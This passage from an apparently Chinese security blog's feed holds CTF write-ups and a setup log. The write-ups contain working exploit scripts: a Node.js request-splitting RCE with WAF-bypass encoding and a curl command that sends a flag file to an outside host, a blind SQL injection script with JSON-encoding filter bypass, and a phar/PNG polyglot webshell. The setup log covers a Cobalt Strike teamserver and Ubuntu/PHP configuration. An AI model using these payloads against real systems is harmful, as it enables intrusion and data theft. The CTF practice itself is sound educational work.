class="line"><span class="built_in">eval</span>(<span class="string">"encodeURI('"</span>+shellcode+<span class="string">"')"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// \r\n --&gt; %C4%8D%C4%8A</span></span><br><span class="line"><span class="comment">// 空格 --&gt; %C4%A0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造如下参数</span></span><br><span class="line"><span class="comment">//z%C4%A0HTTP/1.1%C4%8D%C4%8A%C4%8D%C4%8A%C4%8D%C4%8AGET%C4%A0/flag%C4%A0HTTP/1.1%C4%8D%C4%8A%C4%8D%C4%8A</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># exp.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">payloadRaw = <span class="string">"""x HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost:8081</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------12837266501973088788260782942</span></span><br><span class="line"><span class="string">Content-Length: 6279</span></span><br><span class="line"><span class="string">Origin: http://localhost:8081</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Referer: http://localhost:8081/?action=upload</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------12837266501973088788260782942</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="5am3_get_flag.pug"</span></span><br><span class="line"><span class="string">Content-Type: ../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- global.process.mainModule.require('child_process').execSync('evalcmd')</span></span><br><span class="line"><span class="string">-----------------------------12837266501973088788260782942--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getParm</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload = payload.replace(<span class="string">" "</span>,<span class="string">"%C4%A0"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"\n"</span>,<span class="string">"%C4%8D%C4%8A"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"\""</span>,<span class="string">"%C4%A2"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"'"</span>,<span class="string">"%C4%A7"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"`"</span>,<span class="string">"%C5%A0"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"!"</span>,<span class="string">"%C4%A1"</span>)</span><br><span class="line"></span><br><span class="line">    payload = payload.replace(<span class="string">"+"</span>,<span class="string">"%2B"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">";"</span>,<span class="string">"%3B"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"&amp;"</span>,<span class="string">"%26"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Bypass Waf </span></span><br><span class="line">    payload = payload.replace(<span class="string">"global"</span>,<span class="string">"%C5%A7%C5%AC%C5%AF%C5%A2%C5%A1%C5%AC"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"process"</span>,<span class="string">"%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"mainModule"</span>,<span class="string">"%C5%AD%C5%A1%C5%A9%C5%AE%C5%8D%C5%AF%C5%A4%C5%B5%C5%AC%C5%A5"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"require"</span>,<span class="string">"%C5%B2%C5%A5%C5%B1%C5%B5%C5%A9%C5%B2%C5%A5"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"root"</span>,<span class="string">"%C5%B2%C5%AF%C5%AF%C5%B4"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"child_process"</span>,<span class="string">"%C5%A3%C5%A8%C5%A9%C5%AC%C5%A4%C5%9F%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"exec"</span>,<span class="string">"%C5%A5%C5%B8%C5%A5%C5%A3"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(url,cmd)</span>:</span></span><br><span class="line">    payloadC =  payloadRaw.replace(<span class="string">"evalcmd"</span>,cmd)</span><br><span class="line">    urlC = url+<span class="string">"/core?q="</span>+getParm(payloadC)</span><br><span class="line">    requests.get(urlC)</span><br><span class="line">    </span><br><span class="line">    requests.get(url+<span class="string">"/?action=5am3_get_flag"</span>).text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    targetUrl = sys.argv[<span class="number">1</span>]</span><br><span class="line">    cmd = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">print</span> run(targetUrl,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># python exp.py http://127.0.0.1:8081 "curl eval.com -X POST -d `cat /flag.txt`"</span></span><br></pre></td></tr></table></figure>

<p>剩下一道exExpress坐了别的队的车。那道没做出来，以后补上吧。</p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUOJ刷题_1</title>
    <url>/2020/02/07/buuoj-1/</url>
    <content><![CDATA[<p>记录buuoj刷题</p>
<a id="more"></a>

<h2 id="kzone"><a href="#kzone" class="headerlink" title="kzone"></a>kzone</h2><h4 id="考点：代码审计、sql注入、json编码绕过"><a href="#考点：代码审计、sql注入、json编码绕过" class="headerlink" title="考点：代码审计、sql注入、json编码绕过"></a>考点：代码审计、sql注入、json编码绕过</h4><p>访问链接会跳转到qq空间登录页面，用dirsearch可以爆破到<code>www.zip</code>文件泄露，下载代码进行审计，审计代码大致流程，可以发现included/member.php中存在一处弱类型比较</p>
<p><img src="/2020/02/07/buuoj-1/image-20200207143054839-1581129209172.png" alt="image-20200207143054839"></p>
<p>如果想要利用，直接访问/include/member.php是不可以的，必须是从/include/common.php中包含进来，因为要满足</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!defined(<span class="string">'IN_CRONLITE'</span>)) <span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>

<p>可以看到在/admin/index.php</p>
<p><img src="/2020/02/07/buuoj-1/image-20200207143458244.png" alt="image-20200207143458244"></p>
<p>所以可以访问admin/index.php，利用弱类型比较绕过，</p>
<p><img src="/2020/02/07/buuoj-1/image-20200207143759508.png" alt="image-20200207143759508"></p>
<p>分析程序逻辑还可以用另一个方法绕过，输入一个不存在的admin_user，那么查询出来的密码就为空，同时LOGINKEY可以在源码中找到，</p>
<p><img src="/2020/02/07/buuoj-1/image-20200207144337743.png" alt="image-20200207144337743"></p>
<p>之后找注入点，源码对GET、POST、COOKIE、XFF都进行了过滤，不能注入。但在member.php</p>
<p><img src="/2020/02/07/buuoj-1/image-20200207144631042.png" alt="image-20200207144631042"></p>
<p>对cookie先进行过滤再json解码，所以可以通过编码绕过过滤。尝试使用sqlmap编写tamper但是没有成功。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = payload.replace(<span class="string">'u'</span>, <span class="string">'u0075'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'o'</span>, <span class="string">'u006f'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'i'</span>, <span class="string">'u0069'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">"'"</span>, <span class="string">'u0027'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'"'</span>, <span class="string">'u0022'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">' '</span>, <span class="string">'u0020'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'s'</span>, <span class="string">'u0073'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'#'</span>, <span class="string">'u0023'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'&gt;'</span>, <span class="string">'u003e'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'&lt;'</span>, <span class="string">'u003c'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'-'</span>, <span class="string">'u002d'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'='</span>, <span class="string">'u003d'</span>)</span><br></pre></td></tr></table></figure>

<p>编写脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;fab3873f-f34d-4468-b1d1-df9c59fd565a.node3.buuoj.cn&#x2F;admin&#x2F;&quot;</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">proxies &#x3D; &#123;</span><br><span class="line">  		&quot;http&quot;: &quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;,</span><br><span class="line">		&#125;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">	high &#x3D; 127</span><br><span class="line">	low &#x3D; 32</span><br><span class="line">	mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line">	while high &gt; low:</span><br><span class="line">		#payload&#x3D;&quot;(asci\\u0069(m\\u0069d((\\u0073elect\\u0020group_concat(column_NAME)\\u0020from\\u0020inf\\u006frmation_schema.columnS\\u0020where\\u0020table_name\\u003d\\u0022fl2222g\\u0022),&#123;&#125;,1))\\u003e&#123;&#125;)&quot;</span><br><span class="line">		payload&#x3D;&quot;(asci\\u0069(m\\u0069d((\\u0073elect\\u0020f44ag\\u0020from\\u0020fl2222g),&#123;&#125;,1))\\u003e&#123;&#125;)&quot;</span><br><span class="line">		data&#x3D;&#39;&#123;&quot;admin_user&quot;:&quot;1\\u0027\\u0020\\u006fr\\u0020&#39;+payload.format(i,mid)+&#39;\\u0023&quot;,&quot;admin_pass&quot;:48&#125;&#39;</span><br><span class="line">		cookie&#x3D;&#123;&quot;islogin&quot;:&#39;1&#39;, &quot;login_data&quot;:data&#125;</span><br><span class="line">		print(cookie)</span><br><span class="line">		r&#x3D;requests.post(url,cookies&#x3D;cookie)#,proxies&#x3D;proxies)</span><br><span class="line">		#print(r.content)</span><br><span class="line">		if b&quot;window.location&quot; not in r.content:</span><br><span class="line">			low&#x3D;mid+1 </span><br><span class="line">		else:</span><br><span class="line">			high&#x3D;mid</span><br><span class="line">		mid&#x3D;(low+high)&#x2F;&#x2F;2</span><br><span class="line">	flag+&#x3D;chr(mid)</span><br><span class="line">	print(flag)</span><br><span class="line">#fish_admin,fish_ip,fish_user,fl2222g </span><br><span class="line">#f44ag</span><br></pre></td></tr></table></figure>

<h2 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h2><h4 id="考点：代码审计、文件上传类型判断缺陷"><a href="#考点：代码审计、文件上传类型判断缺陷" class="headerlink" title="考点：代码审计、文件上传类型判断缺陷"></a>考点：代码审计、文件上传类型判断缺陷</h4><p>题目给了源码，是一个文件上传类型题，可以在upload.php中看到</p>
<p><img src="/2020/02/07/buuoj-1/image-20200208085525331.png" alt="image-20200208085525331"></p>
<p>源码中先对文件大小进行判断，然后对文件类型进行了两次判断，第一次是用<code>finfo_file()</code>，限制文件类型必须为<code>image/png</code>。然后又用<code>getimagesize()</code>判断，如果文件类型不为IMAGETYPE_PNG，得到flag。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">var_dump(finfo_file($file, <span class="string">"hazectf.png"</span>));<span class="comment">//string(9) "image/png"</span></span><br><span class="line">finfo_close($file);</span><br><span class="line">$f = getimagesize(<span class="string">"hazectf.png"</span>);</span><br><span class="line">var_dump(getimagesize(<span class="string">"hazectf.png"</span>));<span class="comment">//bool(false)</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/07/buuoj-1/image-20200208093107918.png" alt="image-20200208093107918"></p>
<p>对上面的图片</p>
<ul>
<li>finfo_file：判断类型为imge/png</li>
</ul>
<ul>
<li>getimagesize：不能判断</li>
</ul>
<p>所以可以绕过判断得到flag</p>
<p><img src="/2020/02/07/buuoj-1/image-20200208093301821.png" alt="image-20200208093301821"></p>
<h2 id="HarekazeCTF2019-Avatar-Uploader-2"><a href="#HarekazeCTF2019-Avatar-Uploader-2" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 2"></a>[HarekazeCTF2019]Avatar Uploader 2</h2><h4 id="考点：代码审计、文件包含"><a href="#考点：代码审计、文件包含" class="headerlink" title="考点：代码审计、文件包含"></a>考点：代码审计、文件包含</h4><p>源码和上一题的源码一样，第一个flag在文件上传出，第二个flag考点在文件包含。审计源码，在index.php中存在<code>include()</code>。</p>
<p><img src="/2020/02/07/buuoj-1/image-20200208093734088.png" alt="image-20200208093734088"></p>
<p>尽管<code>include()</code>限制了后缀，但我们可以利用<code>phar</code>来解决。接下来理清代码执行流程，重点是源码对session的操作。题目给了提示：<code>password_hash()</code>函数。</p>
<p><img src="/2020/02/07/buuoj-1/image-20200208094051650.png" alt="image-20200208094051650"></p>
<p>这个函数在password参数超过72后，即使72位后面的字符不相同，也返回相同的散列后的密码。接下来看一下源码的session处理机制。</p>
<p><img src="/2020/02/07/buuoj-1/image-20200208094857822.png" alt="image-20200208094857822"></p>
<p>在index.php中会new一个session，然后执行<code>SecureClientSession</code>类的析构函数，将session认证后，解码后赋值给<code>$data</code>。我们需要伪造session值，使它能够经过认证而且能够在<code>$data</code>中增加<code>theme</code>变量。然后发现</p>
<p><img src="/2020/02/07/buuoj-1/image-20200208100257577.png" alt="image-20200208100257577"></p>
<p><img src="/2020/02/07/buuoj-1/image-20200208100344663.png" alt="image-20200208100344663"></p>
<p>所以在上传文件后未经过重定向的session的值为</p>
<p>eyJuYW1lIjoidHR0dHQiLCJhdmF0YXIiOiIyN2E5NDU4Yi5wbmciLCJmbGFzaCI6eyJ0eXBlIjoiaW5mbyIsIm1lc3N</p>
<p>hZ2UiOiJZb3VyIGF2YXRhciBoYXMgYmVlbiBzdWNjZXNzZnVsbHkgdXBkYXRlZCEifX0.JDJ5JDEwJEM0c3F4W</p>
<p>WQ0QlNFaUExZkZCb0t3NGU4eGlXL0NYdk8yZnJUT1UzWUZXd2lRZktwdlJnaU8y</p>
<p><code>$data</code>json编码后为<code>{&quot;name&quot;:&quot;ttttt&quot;,&quot;avatar&quot;:&quot;27a9458b.png&quot;,&quot;flash{&quot;type&quot;:&quot;info&quot;,&quot;message&quot;:&quot;Your avatar has been successfully updated!&quot;}}</code></p>
<p>长度明显超过72，然后在session中添加<code>theme</code>达到效果。</p>
<h5 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h5><ol>
<li><p>生成phar文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52</span></span><br><span class="line">$png_header = hex2bin(<span class="string">'89504e470d0a1a0a0000000d49484452000000400000004000'</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'exp.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'exp.css'</span>, <span class="string">'&lt;?php system($_GET["cmd"]); ?&gt;'</span>);</span><br><span class="line">$phar-&gt;setStub($png_header . <span class="string">'&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
</li>
<li><p>上传文件修改session</p>
<p><img src="/2020/02/07/buuoj-1/image-20200208101116758.png" alt="image-20200208101116758"></p>
<p><img src="/2020/02/07/buuoj-1/image-20200208101508941.png" alt="image-20200208101508941"></p>
</li>
<li><p>执行命令</p>
<p><img src="/2020/02/07/buuoj-1/image-20200208101915660.png" alt="image-20200208101915660"></p>
</li>
</ol>
<p><strong>ref</strong>:<a href="https://nikoeurus.github.io/2019/11/07/HarekazeCTF2019-Web/" target="_blank" rel="noopener">2019 HarekazeCTF-Web部分复现WriteUp</a></p>
]]></content>
      <tags>
        <tag>刷题记录</tag>
      </tags>
  </entry>
  <entry>
    <title>配置</title>
    <url>/2019/05/04/%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>令人头大的配置记录，持续更新</p>
<a id="more"></a>

<h3 id="debian-java-cobaltstrike-teamserver运行报错"><a href="#debian-java-cobaltstrike-teamserver运行报错" class="headerlink" title="debian java cobaltstrike teamserver运行报错"></a>debian java cobaltstrike teamserver运行报错</h3><p>java not $PATH :root身份运行报错，没有java环境变量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;java java &#x2F;usr&#x2F;java&#x2F;jdk1.8.0_202&#x2F;bin&#x2F;java 100</span><br><span class="line">sudo update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;javac javac &#x2F;usr&#x2F;java&#x2F;jdk1.8.0_202&#x2F;bin&#x2F;javac 100</span><br><span class="line">sudo update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;java_vm java_vm &#x2F;usr&#x2F;java&#x2F;jdk1.8.0_202&#x2F;bin&#x2F;java_vm 100</span><br><span class="line">sudo update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;jcontrol jcontrol &#x2F;usr&#x2F;java&#x2F;jdk1.8.0_202&#x2F;bin&#x2F;jcontrol 100</span><br><span class="line">sudo update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;jexec jexec &#x2F;usr&#x2F;java&#x2F;jdk1.8.0_202&#x2F;jre&#x2F;lib&#x2F;jexec 100</span><br><span class="line">sudo update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;jexec jexec &#x2F;usr&#x2F;java&#x2F;jdk1.8.0_202&#x2F;jre&#x2F;lib&#x2F;jexec 100 --slave &#x2F;usr&#x2F;share&#x2F;binfmts&#x2F;jar jexec-binfmt media&#x2F;mydisk&#x2F;jdk&#x2F;jre&#x2F;lib&#x2F;javaws</span><br></pre></td></tr></table></figure>

<p>cobaltstrike </p>
<p>[-] keytool is not in $PATH<br>    install the Java Developer Kit</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -s &#x2F;usr&#x2F;java&#x2F;jdk1.8.0_202&#x2F;bin&#x2F;bin&#x2F;keytool &#x2F;usr&#x2F;bin&#x2F;</span><br><span class="line">sudo update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;keytool keytool &#x2F;usr&#x2F;java&#x2F;jdk1.8.0_202&#x2F;bin&#x2F;keytool 100</span><br></pre></td></tr></table></figure>

<p>参考</p>
<p><a href="https://superuser.com/questions/408918/trouble-setting-up-path-for-java-on-debian" target="_blank" rel="noopener">1</a></p>
<p><a href="https://askubuntu.com/questions/159575/how-do-i-make-java-default-to-a-manually-installed-jre-jdk" target="_blank" rel="noopener">2</a></p>
<h3 id="Ubuntu虚拟机"><a href="#Ubuntu虚拟机" class="headerlink" title="Ubuntu虚拟机"></a>Ubuntu虚拟机</h3><p>硬盘30G左右</p>
<h3 id="ubuntu安装后卸载不常用的软件"><a href="#ubuntu安装后卸载不常用的软件" class="headerlink" title="ubuntu安装后卸载不常用的软件"></a>ubuntu安装后卸载不常用的软件</h3><ul>
<li><p>16.04</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt purge libreoffice-common  unity-webapps-common thunderbird totem rhythmbox empathy brasero simple-scan gnome-mahjongg aisleriot gnome-mines cheese gnome-sudoku transmission-common gnome-orca webbrowser-app landscape-client-ui-install</span><br></pre></td></tr></table></figure>

<p>libreoffice-common libreoffice（可以换 WPS）<br>unity-webapps-common Amazon 链接<br>thunderbird 雷鸟邮件客户端<br>totem 自带的播放器<br>rhythmbox 自带的音乐播放器<br>empathy 自带的即时聊天应用<br>brasero 自带的光盘刻录器<br>simple-scan 扫描仪<br>gnome-mahjongg 对对碰游戏<br>aisleriot 纸牌游戏<br>gnome-mines 扫雷游戏<br>cheese webcam 应用<br>gnome-sudoku 数独游戏<br>transmission-common BT 客户端<br>gnome-orca 屏幕阅读<br>webbrowser-app Ubuntu 自带的浏览器（有了 chrome 和 Firefox 根本用不到这个）<br>landscape-client-ui-install landscape 远程控制软件<br>deja-dup 备份<br>onboard 屏幕键盘</p>
</li>
<li><p>18.04</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt remove ubuntu-web-launchers</span><br></pre></td></tr></table></figure>

<p>删除Amazon的链接<br>sudo apt-get remove unity-webapps-common # 旧版</p>
<p>sudo apt remove ubuntu-web-launchers # 新版</p>
</li>
</ul>
<h3 id="ubuntu换源"><a href="#ubuntu换源" class="headerlink" title="ubuntu换源"></a>ubuntu换源</h3><p><a href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo cp &#x2F;etc&#x2F;apt&#x2F;sources.list &#x2F;etc&#x2F;apt&#x2F;sources.list.bak</span><br><span class="line">##下一步要确定source.list文件的内容，然后在替换</span><br><span class="line">sudo sed -i &quot;s&#x2F;us.archive.ubuntu.com&#x2F;mirrors.aliyun.com&#x2F;g&quot; &#x2F;etc&#x2F;apt&#x2F;sources.list</span><br></pre></td></tr></table></figure>

<h3 id="ubuntu安装docker"><a href="#ubuntu安装docker" class="headerlink" title="ubuntu安装docker"></a>ubuntu安装docker</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">#添加稳定版仓库</span><br><span class="line">curl -fsSL https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add -</span><br><span class="line">sudo add-apt-repository  &quot;deb [arch&#x3D;amd64] https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;ubuntu $(lsb_release -cs) stable&quot;</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker-ce</span><br><span class="line">sudo docker run hello-world</span><br><span class="line">sudo usermod -a -G docker $USER</span><br><span class="line">#为了可以不用sudo,要注销重新登陆</span><br></pre></td></tr></table></figure>

<p><a href="https://www.jianshu.com/p/49e8f814d6e0" target="_blank" rel="noopener">https://www.jianshu.com/p/49e8f814d6e0</a></p>
<h3 id="ubuntu更换php版本"><a href="#ubuntu更换php版本" class="headerlink" title="ubuntu更换php版本"></a>ubuntu更换php版本</h3><p>查看已经安装的php包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dpkg -l | grep php</span><br></pre></td></tr></table></figure>

<p><img src="/2019/05/04/%E9%85%8D%E7%BD%AE/image-20201120195140654.png" alt="image-20201120195140654"></p>
<p>安装php5.6</p>
<p>ppa:ondrej/php 是一个比较知名的PHP源（目前维护php5.6,php7.0,php7.1,php7.2）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install software-properties-common</span><br><span class="line">sudo add-apt-repository ppa:ondrej&#x2F;php</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install php5.6 </span><br><span class="line">sudo apt-get install php5.6-mbstring php5.6-mcrypt php5.6-mysql php5.6-xml libapache2-mod-php5.6</span><br></pre></td></tr></table></figure>

<p><code>sudo update-alternatives --config php</code>命令可以切换php版本</p>
<p>修改apache的php版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo a2dismod php7.0         # unload the current version</span><br><span class="line">sudo a2enmod  php5.6         # load the version you need</span><br><span class="line">sudo service apache2 restart</span><br></pre></td></tr></table></figure>

<p>安装php-gd扩展</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install php7.0-gd</span><br><span class="line">sudo apt-get install php7.0-zip</span><br></pre></td></tr></table></figure>

<p>开启rewrite</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo a2enmod rewrite</span><br><span class="line"></span><br><span class="line">sudo a2dissite 000-default.conf</span><br><span class="line">sudo a2ensite 000-default.conf</span><br><span class="line">sudo  systemctl reload apache2</span><br></pre></td></tr></table></figure>

<h3 id="ubuntu设置代理"><a href="#ubuntu设置代理" class="headerlink" title="ubuntu设置代理"></a>ubuntu设置代理</h3><ul>
<li>临时</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export http_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:7890</span><br><span class="line">export https_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:7890</span><br><span class="line">export no_proxy&#x3D;&quot;127.0.0.1, localhost, *.cnn.com, 192.168.1.10, domain.com:8080&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>临时取消代理<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unset http_proxy</span><br><span class="line"></span><br><span class="line">unset https_proxy</span><br></pre></td></tr></table></figure>


</li>
</ul>
<ul>
<li>持久化</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim ~&#x2F;.bashrc</span><br><span class="line">export http_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:7890</span><br><span class="line">export https_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:7890</span><br><span class="line">export no_proxy&#x3D;&quot;127.0.0.1, localhost, *.cnn.com, 192.168.1.10, domain.com:8080&quot;</span><br><span class="line">source ~&#x2F;.bashrc</span><br></pre></td></tr></table></figure>

<h3 id="mongodb-Ubuntu安装及报错"><a href="#mongodb-Ubuntu安装及报错" class="headerlink" title="mongodb Ubuntu安装及报错"></a>mongodb Ubuntu安装及报错</h3><p><a href="https://www.jb51.net/article/109091.htm" target="_blank" rel="noopener">https://www.jb51.net/article/109091.htm</a></p>
<p><a href="https://blog.csdn.net/zn505119020/article/details/81331808" target="_blank" rel="noopener">https://blog.csdn.net/zn505119020/article/details/81331808</a></p>
<h3 id="apt-get-install-报错"><a href="#apt-get-install-报错" class="headerlink" title="apt-get install 报错"></a>apt-get install 报错</h3><p>E: Could not get lock /var/lib/dpkg/lock - open (11: Resource temporarily unavailable)<br> E: Unable to lock the administration directory (/var/lib/dpkg/), is another process using it</p>
<p>在终端中敲入以下两句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo rm &#x2F;var&#x2F;cache&#x2F;apt&#x2F;archives&#x2F;lock</span><br><span class="line"></span><br><span class="line">sudo rm &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;lock</span><br></pre></td></tr></table></figure>

<h3 id="lamp"><a href="#lamp" class="headerlink" title="lamp"></a>lamp</h3><p>安装多版本php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install software-properties-common</span><br><span class="line">sudo add-apt-repository ppa:ondrej&#x2F;php</span><br><span class="line">sudo apt-get update</span><br><span class="line">#下载php5.6的命令</span><br><span class="line">sudo apt-get install -y php5.6-common php5.6-mbstring php5.6-mcrypt php5.6-mysql php5.6-xml php5.6-gd php5.6-curl php5.6-json php5.6-fpm php5.6-zip php5.6-mcrypt libapache2-mod-php5.6</span><br><span class="line">#下载php7.0的命令</span><br><span class="line">sudo apt-get install -y php7.0-common php7.0-mbstring php7.0-mcrypt php7.0-mysql php7.0-xml php7.0-gd php7.0-curl php7.0-json php7.0-fpm php7.0-zip php7.0-mcrypt libapache2-mod-php7.0</span><br><span class="line">#下载php7.1的命令</span><br><span class="line">sudo apt-get install -y php7.1-common php7.1-mbstring php7.1-mcrypt php7.1-mysql php7.1-xml php7.1-gd php7.1-curl php7.1-json php7.1-fpm php7.1-zip php7.1-mcrypt libapache2-mod-php7.1</span><br><span class="line"># 下载php7.4的命令</span><br><span class="line">sudo apt-get install -y php7.4-common php7.4-mbstring php7.4-mcrypt php7.4-mysql php7.4-xml php7.4-gd php7.4-curl php7.4-json php7.4-fpm php7.4-zip php7.4-mcrypt libapache2-mod-php7.4</span><br><span class="line"># 下载php7.2的命令</span><br><span class="line">sudo apt-get install -y php7.2-common php7.2-mbstring php7.2-mcrypt php7.2-mysql php7.2-xml php7.2-gd php7.2-curl php7.2-json php7.2-fpm php7.2-zip php7.2-mcrypt libapache2-mod-php7.2  php7.2-dev</span><br><span class="line"></span><br><span class="line">sudo apt-get install -y php7.4.3-common php7.4.3-mbstring php7.4.3-mcrypt php7.4.3-mysql php7.4.3-xml php7.4.3-gd php7.4.3-curl php7.4.3-json php7.4.3-fpm php7.4.3-zip php7.4.3-mcrypt libapache2-mod-php7.4.3</span><br><span class="line">#切换默认php版本</span><br><span class="line">sudo update-alternatives --config php 修改版本</span><br><span class="line">#PS:切换版本之前或切换之后要把被切换额版本停用</span><br><span class="line">#开启一个php版本</span><br><span 